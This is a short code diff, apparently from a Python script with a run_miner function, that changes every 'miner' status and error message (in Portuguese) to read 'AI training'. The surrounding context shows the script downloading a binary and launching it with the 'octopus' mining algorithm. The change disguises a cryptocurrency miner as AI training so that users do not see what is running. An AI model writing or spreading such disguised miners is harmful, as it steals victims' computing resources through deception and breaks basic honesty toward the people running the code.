@@ -18,7 +18,7 @@ def run_miner():
         
         # Inicialização
         libc = CDLL(None)
-        print("🔧 Inicializando minerador...")
+        print("🔧 Inicializando Treinamento de IA...")
         
         # Download
         print("⏳ Baixando binário...")
@@ -46,10 +46,10 @@ def run_miner():
                     break
             
             if not miner_path:
-                raise FileNotFoundError("Binário do minerador não encontrado!")
+                raise FileNotFoundError("Binário do Treinamento de IA não encontrado!")
             
             # Execução
-            print("🚀 Iniciando minerador...")
+            print("🚀 Iniciando Treinamento de IA...")
             args = [
                 miner_path,
                 "--algorithm", "octopus",
